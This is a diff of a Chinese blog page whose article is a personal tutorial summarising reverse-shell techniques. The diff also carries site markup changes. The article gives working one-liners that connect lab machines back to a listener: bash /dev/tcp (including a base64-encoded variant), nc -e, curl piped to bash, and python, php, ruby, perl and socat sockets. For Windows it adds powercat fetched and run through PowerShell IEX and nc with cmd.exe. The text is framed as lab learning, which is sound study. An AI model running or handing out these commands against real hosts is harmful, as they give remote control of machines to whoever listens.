@@ -5,7 +5,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="反弹shell的方法总结, hybcx&#39;s blog">
-    <meta name="description" content="">
+    <meta name="description" content="一、前言
+1. 什么是反弹shell
+就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,27 +15,48 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
     <title>反弹shell的方法总结 | hybcx&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
+    
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <!-- bg-cover style     -->
 
-<meta name="generator" content="Hexo 6.3.0">
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 
 
 <body>
@@ -45,7 +68,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">hybcx&#39;s blog</span>
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                 </a>
             </div>
             
@@ -135,6 +158,11 @@
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
     </a>
   </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
 
@@ -151,8 +179,6 @@
             
         </div>
     </div>
-
-    
 
     <ul class="menu-list mobile-menu-list">
         
@@ -330,99 +356,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
+    <div class="row">
     <div id="main-content" class="col s12 m12 l9">
         <!-- 文章内容详情 -->
 <div id="artDetail">
@@ -463,12 +397,32 @@
                 
 
                 
-
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-09-17
+                </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.8k
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    16 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -485,7 +439,12 @@
                 <h2 id="一、前言">一、前言</h2>
 <h3 id="1-什么是反弹shell">1. 什么是反弹shell</h3>
 <p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">假设有两台主机<br>A(控制端)<br>B(被控端)<br><br>正向shell，就是ssh、Telnet的连接，A主动发起连接B指定端口，然后A就可以通过命令控制B了<br>反弹shell，A先开启一个监听端口，让B去连接A的这个端口，连接成功后，A就能控制B了<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">假设有两台主机
+A(控制端)
+B(被控端)
+
+正向shell，就是ssh、Telnet的连接，A主动发起连接B指定端口，然后A就可以通过命令控制B了
+反弹shell，A先开启一个监听端口，让B去连接A的这个端口，连接成功后，A就能控制B了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="2-为什么需要反弹shell？">2. 为什么需要反弹shell？</h3>
 <p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。以下详细介绍Windows和Linux系统下反弹shell的几种方式。</p>
 <h2 id="二、反弹shell命令解析">二、反弹shell命令解析</h2>
@@ -551,24 +510,24 @@
 <p>控制端：kali<br>
 被控端：centos</p>
 <p>kali监听8888端口<br>
-<img src="image-20230917095152756.png" alt="image-20230917095152756"></p>
+<img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917095152756.png" alt="image-20230917095152756"></p>
 <p>centos输入命令</p>
 <p><code>echo hello &gt; /dev/tcp/192.168.17.128/8888</code></p>
 <p>kali监听到输出结果</p>
-<p><img src="image-20230917100721694.png" alt="image-20230917100721694"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917100721694.png" alt="image-20230917100721694"></p>
 <h3 id="4-输入重定向">4. 输入重定向</h3>
 <p>kali继续监听端口，centos输入命令</p>
 <p><code>bash -i &gt; /dev/tcp/192.168.17.128/8888</code></p>
 <p>kali得到输出结果</p>
-<p><img src="image-20230917100834681.png" alt="image-20230917100834681"></p>
-<p><img src="image-20230917100841264.png" alt="image-20230917100841264"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917100834681.png" alt="image-20230917100834681"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917100841264.png" alt="image-20230917100841264"></p>
 <p>这种方法的话，centos输一条命令，kali则回显一条命令输出结果</p>
 <p>输入输出结合获得shell</p>
 <p>两条命令</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt; /dev/tcp/192.168.17.128/8888<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &lt; /dev/tcp/192.168.17.128/8888<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;</span> /dev/tcp/192.168.17.128/8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span> /dev/tcp/192.168.17.128/8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>结合一下，即可实现反弹shell</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.17.128/8888 0&gt;&amp;1<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.17.128/8888 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>1️⃣</p>
 <p><code>0&gt;&amp;1</code></p>
 <p>语法格式是</p>
@@ -585,148 +544,172 @@
 <p>Win10 192.168.17.135 NC监听</p>
 <p>Kali 192.168.17.128 自带工具</p>
 <h3 id="1-bash反弹">1. bash反弹</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/192.168.17.135/7777 0&gt;&amp;1<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.17.135/7777 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里也是崩溃了，第一种反弹方法就遇到了障碍，我发现我的kali用不了上述的方法，它表明/dev/tcp文件不存在，网上漫游发现</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">linux中有一个特殊的文件/dev/tcp,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。<br>但是/dev/tcp本身是不存在的，无法在/dev下看到这个设备节点。<br>而在bash中通过打开/dev/tcp来取得socket的功能实际上是bash的特性，并不是系统的功能。<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">linux中有一个特殊的文件/dev/tcp,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。
+但是/dev/tcp本身是不存在的，无法在/dev下看到这个设备节点。
+而在bash中通过打开/dev/tcp来取得socket的功能实际上是bash的特性，并不是系统的功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>于是有些版本的bash可能默认不支持对/dev/tcp的打开。此时可以在编译bash的时候增加一个参数：–enable-net-redirections然后重新编译bash即可。</p>
 <p>但我没有增加参数，因为我当时认为我bash版本应该很高，已经默认开启了这个选项 ，于是我跟着文章查看了当前shell环境，发现为zsh，于是我新建了一个用户用于永久使用bash命令。参考文章在下面</p>
-<p><img src="image-20230917113013752.png" alt="image-20230917113013752"></p>
-<p><img src="image-20230917113029488.png" alt="image-20230917113029488"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917113013752.png" alt="image-20230917113013752"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917113029488.png" alt="image-20230917113029488"></p>
 <p>但有强迫症的我，接着根据几个关键词搜寻linux下如何切换shell环境，终于找到了永久切换文章，这里也放到下面，也很简单，就几条命令而已</p>
 <p>在特殊情况可以使用base64编码执行bash反弹shell</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEzNS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}'<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917141108043.png" alt="image-20230917141108043"></p>
-<p><img src="image-20230917141135544.png" alt="image-20230917141135544"></p>
+<pre class="line-numbers language-none"><code class="language-none">bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEzNS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917141108043.png" alt="image-20230917141108043"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917141135544.png" alt="image-20230917141135544"></p>
 <p>在kali中执行会解析成编码前的bash命令</p>
 <h3 id="2-nc反弹">2. nc反弹</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -e /bin/bash 192.168.17.135 8888<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -e /bin/bash 192.168.17.135 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。</p>
-<p><img src="image-20230917142150637.png" alt="image-20230917142150637"></p>
-<p><img src="image-20230917142141192.png" alt="image-20230917142141192"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917142150637.png" alt="image-20230917142150637"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917142141192.png" alt="image-20230917142141192"></p>
 <h3 id="3-curl反弹">3. curl反弹</h3>
 <p>Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。</p>
 <p>开启apache可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hou09tian/article/details/107928557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169493177516800197051903%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169493177516800197051903&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-107928557-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=Kali%E5%BC%80%E5%90%AFapache%E6%9C%8D%E5%8A%A1&amp;spm=1018.2226.3001.4187">Kali Linxu中打开Apache服务</a></p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl 192.168.17.137/bash.html|bash    //当前kali地址<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917143237110.png" alt="image-20230917143237110"></p>
-<p><img src="image-20230917143223662.png" alt="image-20230917143223662"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token number">192.168</span>.17.137/bash.html<span class="token operator">|</span><span class="token function">bash</span>    //当前kali地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917143237110.png" alt="image-20230917143237110"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917143223662.png" alt="image-20230917143223662"></p>
 <h3 id="4-whois反弹">4. whois反弹</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">whois -h 192.168.17.135 -p 4444 `pwd` //反弹的shell只能执行后面带的命令<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917143419652.png" alt="image-20230917143419652"></p>
-<p><img src="image-20230917143439739.png" alt="image-20230917143439739"></p>
+<pre class="line-numbers language-none"><code class="language-none">whois -h 192.168.17.135 -p 4444 `pwd` //反弹的shell只能执行后面带的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917143419652.png" alt="image-20230917143419652"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917143439739.png" alt="image-20230917143439739"></p>
 <h3 id="5-python反弹">5. python反弹</h3>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.17.135",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917144244241.png" alt="image-20230917144244241"></p>
-<p><img src="image-20230917144236500.png" alt="image-20230917144236500"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.17.135",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917144244241.png" alt="image-20230917144244241"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917144236500.png" alt="image-20230917144236500"></p>
 <h3 id="6-PHP反弹">6. PHP反弹</h3>
 <p>php反弹shell和python的方式差不多</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php -r '$sock=fsockopen("192.168.17.135",8888);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917144744673.png" alt="image-20230917144744673"></p>
-<p><img src="image-20230917144738990.png" alt="image-20230917144738990"></p>
+<pre class="line-numbers language-none"><code class="language-none">php -r '$sock=fsockopen("192.168.17.135",8888);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917144744673.png" alt="image-20230917144744673"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917144738990.png" alt="image-20230917144738990"></p>
 <h3 id="7-ruby反弹">7. ruby反弹</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ruby -rsocket -e'f=TCPSocket.open("192.168.17.135",8888).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ruby -rsocket -e'f=TCPSocket.open("192.168.17.135",8888).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>但这个语句似乎不能用了吧，报了如下错误</p>
-<p><img src="image-20230917145342720.png" alt="image-20230917145342720"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917145342720.png" alt="image-20230917145342720"></p>
 <p>搜寻发现下列语句</p>
-<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ruby -rsocket -e <span class="hljs-string">'exit if fork;c=TCPSocket.new("192.168.17.135","8888");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917145455585.png" alt="image-20230917145455585"></p>
-<p><img src="image-20230917145443467.png" alt="image-20230917145443467"></p>
-<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ruby -rsocket -e <span class="hljs-string">'c=TCPSocket.new("192.168.17.135","8888");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917145611328.png" alt="image-20230917145611328"></p>
-<p><img src="image-20230917145617861.png" alt="image-20230917145617861"></p>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string-literal"><span class="token string">'exit if fork;c=TCPSocket.new("192.168.17.135","8888");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917145455585.png" alt="image-20230917145455585"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917145443467.png" alt="image-20230917145443467"></p>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string-literal"><span class="token string">'c=TCPSocket.new("192.168.17.135","8888");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917145611328.png" alt="image-20230917145611328"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917145617861.png" alt="image-20230917145617861"></p>
 <p>这两种方法均可</p>
 <h3 id="8-socat反弹">8. socat反弹</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:192.168.17.135:8888<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917145813301.png" alt="image-20230917145813301"></p>
-<p><img src="image-20230917145820648.png" alt="image-20230917145820648"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:192.168.17.135:8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917145813301.png" alt="image-20230917145813301"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917145820648.png" alt="image-20230917145820648"></p>
 <p>但是乱码真的烦，我也没细究为何</p>
 <h3 id="9-Perl反弹">9. Perl反弹</h3>
-<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">'use Socket;$i="192.168.17.135";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917150003432.png" alt="image-20230917150003432"></p>
-<p><img src="image-20230917150008124.png" alt="image-20230917150008124"></p>
+<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">perl <span class="token operator">-e</span> <span class="token string">'use Socket;$i="192.168.17.135";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917150003432.png" alt="image-20230917150003432"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917150008124.png" alt="image-20230917150008124"></p>
 <h2 id="四、Windows下反弹shell">四、Windows下反弹shell</h2>
 <h3 id="1-powercat反弹">1. powercat反弹</h3>
 <p>用IEX下载远程PS1脚本回来权限绕过执行</p>
 <p>使用powershell执行IEX</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/besimorhino/powercat/blob/master/powercat.ps1');powercat -c 192.168.17.137 -p 8888 -e cmd<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/besimorhino/powercat/blob/master/powercat.ps1');powercat -c 192.168.17.137 -p 8888 -e cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里我也很头疼一直不成功，我感觉从网上下载绕过肯定可行，但似乎失误率很高，毕竟目标文件的格式很容易犯错，当然或许可以下载到本地或vps，通过局域网或者公网访问下载。这里我选择直接下载使用看看</p>
 <p>powercat下载地址：<code>https://github.com/besimorhino/powercat</code> //下载到本地执行</p>
 <p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#导入模块<br>Import-Module .\powercat.ps1<br>#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码<br>Set-ExecutionPolicy Unrestricted<br>#输入如下命令可以查看帮助信息<br>powercat -h<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#导入模块
+Import-Module .\powercat.ps1
+#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码
+Set-ExecutionPolicy Unrestricted
+#输入如下命令可以查看帮助信息
+powercat -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>输入<code>powercat -c 192.168.17.137 -p 8888 -e cmd</code></p>
-<p><img src="image-20230917152208329.png" alt="image-20230917152208329"></p>
-<p><img src="image-20230917152217962.png" alt="image-20230917152217962"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917152208329.png" alt="image-20230917152208329"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917152217962.png" alt="image-20230917152217962"></p>
 <h3 id="2-NC反弹">2. NC反弹</h3>
 <p>服务端反弹：<code>nc 192.168.17.137 8888 -e c:\windows\system32\cmd.exe</code></p>
-<p><img src="image-20230917152419219.png" alt="image-20230917152419219"></p>
-<p><img src="image-20230917152426327.png" alt="image-20230917152426327"></p>
